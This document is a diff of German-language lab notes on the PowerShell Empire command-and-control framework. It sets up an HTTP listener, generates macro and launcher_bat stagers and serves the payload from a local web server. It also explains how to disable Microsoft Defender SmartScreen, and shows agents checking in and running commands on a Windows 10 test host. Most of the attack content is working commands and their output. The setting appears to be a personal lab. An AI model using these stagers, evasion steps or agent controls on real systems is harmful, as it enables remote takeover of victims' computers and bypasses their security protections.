@@ -94,7 +94,6 @@ Listener, Stager, Agents, Module
 Anzeige der listener und wechsel in den Listener Kontext
 
 ```
-
 (Empire) > listeners
 [!] No listeners currently active 
 (Empire: listeners) > list
@@ -103,8 +102,6 @@ Anzeige der listener und wechsel in den Listener Kontext
 (Empire: listeners) > uselistener <TAB><TAB>
 dbx             http            http_com        http_foreign    http_hop        http_malleable  http_mapi       meterpreter     onedrive        redirector
 (Empire: listeners) > uselistener 
-
-
 ```
 
 ```
@@ -150,15 +147,9 @@ HTTP[S] Options:
   SlackURL          False                                        Your Slack Incoming Webhook URL to communicate with your Slack instance.
 ```
 
-
-
 ```
 (Empire: listeners/http) > set Port 80
 ```
-
- 
-
-
 
 ```
 (Empire: listeners/http) > execute
@@ -313,7 +304,7 @@ Description:
 
 ```
 
-`http` ist der Name des listeners
+`http` ist der Name des listeners. Ausgabe auf stdout oder man setzt `OutFile`
 
 ```
 (Empire: stager/windows/macro) > set OutFile /tmp/macro
@@ -323,4 +314,142 @@ Description:
 
 ```
 
-Hat nicht funktioniert (27.05.2021)
+Excel Datei mit dem Makro erstellen. Siehe [Excel Backdoor Makro](excel_backdoor_makro)
+
+Weiter mit 
+
+```
+agents
+interact <Name>
+info
+```
+
+![image-20210530155407057](fig/image-20210530155407057.png)
+
+```
+(Empire: agents) > 
+[*] Sending POWERSHELL stager (stage 1) to 192.168.178.82                                                                               
+[*] New agent H47YS5CV checked in
+[+] Initial agent H47YS5CV from 192.168.178.82 now active (Slack)
+[*] Sending agent (stage 2) to H47YS5CV at 192.168.178.82
+agents
+
+[*] Active agents:
+                                                                                                                                        
+ Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+ ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+ H47YS5CV ps 192.168.178.82  DESKTOP-KB6QKG7   DESKTOP-KB6QKG7\test    powershell         5912   5/0.0    2021-05-30 13:50:31  ListenerTest    
+
+(Empire: agents) > interact H47YS5CV
+(Empire: H47YS5CV) > info
+
+[*] Agent info:                                                                                                                         
+                                                                                                                                        
+        checkin_time            2021-05-30 13:48:25.044699+00:00
+        delay                   5
+        external_ip             192.168.178.82
+        high_integrity          False
+        hostname                DESKTOP-KB6QKG7
+        internal_ip             192.168.178.82
+        jitter                  0.0
+        kill_date       
+        language                powershell
+        language_version        5
+        lastseen_time           2021-05-30 13:50:41.525684+00:00
+        listener                ListenerTest
+        lost_limit              60
+        name                    H47YS5CV
+        nonce                   8846145887167469
+        os_details              Microsoft Windows 10 Pro
+        process_id              5912
+        process_name            powershell
+        profile                 /admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT
+                                6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+        session_id              H47YS5CV
+        session_key             [*nklTP2MsD_A1Rc:#j|zqi5\o4x6?Z{
+        username                DESKTOP-KB6QKG7\test
+        working_hours   
+
+
+```
+
+
+
+# launcher_bat Test 29.05.2021
+
+[Infos](https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/)
+
+```
+usestager windows/launcher_bat
+
+```
+
+`help` `info`
+
+```
+(Empire: stager/windows/launcher_bat) > set Listener ListenerTest
+(Empire: stager/windows/launcher_bat) > execute
+```
+
+
+
+```bash
+cd /tmp
+python3 -m http.server 8080
+```
+
+MS Edge
+
+---
+
+### To turn SmartScreen on or off in the new Microsoft Edge:
+
+1. Select **Settings and more** > **Settings** > **Privacy & services** .
+2. Scroll down to **Services**, and turn **Microsoft Defender SmartScreen** on or off.
+
+Einstellungen > Datenschutz Suche und Dienste > Sicherheit > Microsoft Defender SmartScreen ausschalten
+
+---
+
+Auf Windows `launcher.bat` über die Kommandozeile starten (Doppelclick wird von Windows verhindert)
+
+Empire meldet:
+
+```
+(Empire: agents) > 
+[*] Sending POWERSHELL stager (stage 1) to 192.168.178.82                                                                            
+[*] New agent 4NE5196G checked in
+[+] Initial agent 4NE5196G from 192.168.178.82 now active (Slack)
+[*] Sending agent (stage 2) to 4NE5196G at 192.168.178.82
+```
+
+
+
+```
+(Empire: agents) > agents
+
+[*] Active agents:
+                                                                                                                                     
+ Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+ ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+ 4NE5196G ps 192.168.178.82  DESKTOP-KB6QKG7   DESKTOP-KB6QKG7\test    powershell         5632   5/0.0    2021-05-29 14:21:10  ListenerTest    
+
+(Empire: agents) >
+```
+
+
+
+```
+(Empire: agents) > interact 4NE5196G
+(Empire: 4NE5196G) > dir
+[*] Tasked 4NE5196G to run TASK_SHELL
+[*] Agent 4NE5196G tasked with task ID 1
+(Empire: 4NE5196G) > 
+Mode   Owner                LastWriteTime        Length Name                
+----   -----                -------------        ------ ----                
+-a-hs- DESKTOP-KB6QKG7\test 27.05.2021 12:17:01     282 desktop.ini         
+-a---- DESKTOP-KB6QKG7\test 29.05.2021 16:17:58    5249 launcher - Kopie.bat
+-a---- DESKTOP-KB6QKG7\test 29.05.2021 16:17:58    5249 launcher.bat        
+-a---- DESKTOP-KB6QKG7\test 27.05.2021 13:36:48 7327912 OfficeSetup.exe
+```
+
